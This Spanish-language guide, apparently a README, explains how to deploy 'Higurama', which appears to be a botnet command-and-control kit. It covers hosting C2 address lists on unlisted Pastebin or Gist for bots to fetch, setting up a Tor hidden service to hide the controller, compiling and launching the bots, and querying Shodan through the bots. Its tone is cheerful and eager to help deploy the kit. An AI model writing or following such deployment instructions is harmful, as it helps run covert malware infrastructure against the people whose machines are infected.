# 🚀 GUÍA DE CONFIGURACIÓN - HIGURAMA

## 📋 CHECKLIST DE CONFIGURACIÓN

### ✅ **YA CONFIGURADO:**
- [x] Estructura de carpetas organizada
- [x] ASCII arts personalizados agregados
- [x] Disclaimers legales completos
- [x] Scripts de deployment creados
- [x] Certificados SSL (cert.pem, key.pem)
- [x] Binarios compilados en bots/

### 🔴 **PENDIENTE - CRÍTICO:**

#### 1. Configurar URLs del JSON (OBLIGATORIO)

**Archivos a editar:**
- `src/higurashi.py` línea 45-46
- `config/c2_servers.json` líneas 26-27

**Pasos:**

**Opción A - Pastebin (Recomendado):**
```
1. Ir a: https://pastebin.com/
2. Pegar contenido de config/c2_servers.json
3. Visibility: Unlisted
4. Crear paste
5. Click derecho en "RAW" → Copy link address
6. Reemplazar en higurashi.py:
   JSON_URLS = [
       'https://pastebin.com/raw/ABC123',  # Tu URL aquí
   ]
```

**Opción B - GitHub Gist:**
```
1. Ir a: https://gist.github.com/
2. Crear gist público con c2_servers.json
3. Click en "Raw"
4. Copiar URL
5. Reemplazar en higurashi.py:
   JSON_URLS = [
       'https://gist.githubusercontent.com/Vixy-beep/xxxxx/raw/c2_servers.json',
   ]
```

#### 2. Configurar Tor Hidden Service (OBLIGATORIO para anonimato)

**Ejecutar:**
```bash
# Windows
python scripts/setup_tor_c2.py

# Linux
sudo python3 scripts/setup_tor_c2.py
```

**Esto hará:**
- ✅ Instalar/verificar Tor
- ✅ Configurar hidden service automáticamente
- ✅ Generar tu dirección .onion
- ✅ Actualizar config/c2_servers.json con tu .onion

**Después:**
- Copia tu .onion generado
- Actualízalo en Pastebin/Gist
- Los bots se conectarán automáticamente

#### 3. Obtener Shodan API Key (OPCIONAL pero recomendado)

**Pasos:**
```
1. Ir a: https://account.shodan.io/register
2. Crear cuenta gratis
3. Ir a: https://account.shodan.io/
4. Copiar tu API key
5. Guardarla para usar con: shodan <bot> <api_key>
```

**Nota:** La cuenta gratis da 100 queries/mes (suficiente para testing).

### 🟢 **OPCIONAL:**

#### 4. Configurar IP de tu red local

**Si vas a probar localmente:**
- Editar `config/c2_servers.json` línea 18
- Cambiar `192.168.56.1` por tu IP local
- Ejecutar: `ipconfig` (Windows) o `ifconfig` (Linux)

#### 5. Instalar dependencias

```bash
pip install -r config/requirements.txt
```

---

## 🎯 **ORDEN DE CONFIGURACIÓN RECOMENDADO:**

### **Paso 1: Setup básico (5 minutos)**
```bash
# Instalar dependencias
pip install -r config/requirements.txt

# Generar .onion
python scripts/setup_tor_c2.py
```

### **Paso 2: Subir JSON (2 minutos)**
```
1. Copiar contenido de config/c2_servers.json
2. Subirlo a Pastebin (Unlisted)
3. Copiar URL RAW
```

### **Paso 3: Actualizar bot (1 minuto)**
```python
# Editar src/higurashi.py línea 45
JSON_URLS = [
    'https://pastebin.com/raw/TU_ID_AQUI',  # ← Pegar tu URL
]
```

### **Paso 4: Subir cambios a GitHub (1 minuto)**
```bash
git add .
git commit -m "Updated configuration with Pastebin URL"
git push origin main
```

### **Paso 5: Compilar y probar (5 minutos)**
```bash
# Compilar bots
python scripts/COMPILE_NOW.bat

# Iniciar C2
python src/higurama.py

# En otra terminal, iniciar bot
python src/higurashi.py
```

---

## 📊 **ESTADO ACTUAL:**

### ✅ Listo para usar:
- Estructura de carpetas
- Código fuente completo
- ASCII arts personalizados
- Documentación legal
- Scripts de deployment

### ⚠️ Necesita configuración:
- URLs de descarga (Pastebin/Gist)
- Dirección .onion de Tor
- Shodan API key (opcional)

### 🎯 Tiempo estimado total:
- **Configuración mínima:** 10 minutos
- **Configuración completa:** 20 minutos

---

## 🔧 **ARCHIVOS QUE DEBES EDITAR:**

```
config/c2_servers.json
├── Línea 7:  address: "TU_ONION.onion"  ← Después de setup_tor_c2.py
├── Línea 18: address: "TU_IP_LOCAL"     ← Opcional
└── Línea 26: cdn_mirrors URL            ← Tu Pastebin/Gist

src/higurashi.py
└── Línea 45: JSON_URLS                   ← Tu Pastebin/Gist
```

---

## 🚨 **ERRORES COMUNES:**

### "Bot no se conecta al C2"
```
Solución:
1. Verificar que Tor esté corriendo
2. Verificar que C2 esté corriendo (python src/higurama.py)
3. Verificar firewall no bloquea puerto 8443
4. Verificar JSON_URLS es accesible
```

### "No puede descargar c2_servers.json"
```
Solución:
1. Verificar que Pastebin/Gist URL sea RAW
2. Probar abrir URL en navegador
3. Verificar que paste sea Unlisted (no Private)
```

### "Tor no se conecta"
```
Solución:
1. Verificar Tor está instalado
2. Reiniciar servicio Tor
3. Verificar puerto 9050 no está bloqueado
```

---

## 🎉 **SIGUIENTE PASO:**

**Ejecuta este script para configuración rápida:**

```bash
# Windows
scripts/quick_deploy.bat

# Elige opción 1: Setup Tor
```

O sigue los pasos manuales arriba. ¡Estás a 10 minutos de tener todo funcionando! 🚀

---

**¿Necesitas ayuda con algún paso específico?** Pregúntame! 💀
